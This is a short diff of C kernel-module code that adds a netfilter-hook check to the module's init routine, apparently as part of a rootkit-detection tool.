@@ -71,6 +71,12 @@ int init_module (void)
 		return ret;
 	}
 	
+	ret = check_netfilter_hooks();
+	if(ret < 0) {
+		ROOTKIT_DEBUG("Error while checking netfiler hooks!\n");
+		return ret;
+	}
+	
 	ret = count_modules();
 	if(ret < 0) {
 		ROOTKIT_DEBUG("Error while checking the loaded modules!\n");
